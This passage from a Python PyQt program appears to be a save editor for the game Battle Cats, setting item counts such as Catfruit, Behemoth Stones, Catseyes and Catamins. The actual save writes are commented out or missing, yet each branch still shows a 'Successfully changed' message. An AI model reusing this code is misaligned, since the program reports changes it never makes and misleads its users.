                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Green Catfruit":
                        #save_stats["cat_fruit"][8] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Yellow Catfruit":
                        #save_stats["cat_fruit"][9] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Epic Catfruit":
                        #save_stats["cat_fruit"][10] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Elder Catfruit Seed":
                        #save_stats["cat_fruit"][11] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Elder Catfruit":
                        #save_stats["cat_fruit"][12] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Epic Catfruit Seed":
                        #save_stats["cat_fruit"][13] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Gold Catfruit":
                        #save_stats["cat_fruit"][14] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Aku Catfruit Seed":
                        #save_stats["cat_fruit"][15] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Aku Catfruit":
                        #save_stats["cat_fruit"][16] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Gold Catfruit Seed":
                        #save_stats["cat_fruit"][17] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Purple B. Stone":
                        #save_stats["cat_fruit"][18] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Red B. Stone":
                        #save_stats["cat_fruit"][19] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Blue B. Stone":
                        #save_stats["cat_fruit"][20] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Green B. Stone":
                        #save_stats["cat_fruit"][21] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Yellow B. Stone":
                        #save_stats["cat_fruit"][22] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Purple B. Gem":
                        #save_stats["cat_fruit"][23] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Red B. Gem":
                        #save_stats["cat_fruit"][24] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Blue B. Gem":
                        #save_stats["cat_fruit"][25] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Green B. Gem":
                        #save_stats["cat_fruit"][26] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Yellow B. Gem":
                        #save_stats["cat_fruit"][27] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Epic B. Stone":
                        #save_stats["cat_fruit"][28] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    else:
                        QMessageBox.warning(self, 'Warning', 'Invalid item type',
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
            elif selected == "Catseyes":
                amount = int(self.amountinput.text())
                item_type = self.item_menu_combobox_2.currentText()
                max = 10000
                value = amount
                if amount >= max:
                    QMessageBox.warning(self, 'Warning', 'Max value for [Cat Fruit / Behemoth Stones] is {}'.format(max-1),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    if item_type == "Normal":
                        ##save_stats["catseyes"][0] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "EX":
                        ##save_stats["catseyes"][1] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Rare":
                        ##save_stats["catseyes"][2] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Super Rare":
                        ##save_stats["catseyes"][3] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Uber Rare":
                        ##save_stats["catseyes"][4] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Legend":
                        ##save_stats["catseyes"][5] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    else:
                        QMessageBox.warning(self, 'Warning', 'Invalid item type',
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
            elif selected == "Catamins":
                amount = int(self.amountinput.text())
                item_type = self.item_menu_combobox_2.currentText()
                max = 10000
                if amount >= max:
                    QMessageBox.warning(self, 'Warning', 'Max value for [Catamins] is {}'.format(max-1),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    value = amount
                    if item_type == "A":

                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "B":

                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "C":

                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Select All":

                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(selected, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    else:
                        QMessageBox.warning(self, 'Warning', 'Invalid item type',
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)

            else:
                QMessageBox.warning(self, 'Warning', 'Invalid item type',
                                        QMessageBox.Ok)
                self.progressbar.setValue(0)
            
        except Exception as e:
            QMessageBox.critical(self, 'Error', '{}'.format(traceback.format_exc()),
                                    QMessageBox.Ok)
            self.progressbar.setValue(0)
            pass
        

        



if __name__ == "__main__":
        
        app = QApplication(sys.argv) 
        myWindow = WindowClass2() 
        myWindow.show()
        get_token()
        app.exec_()
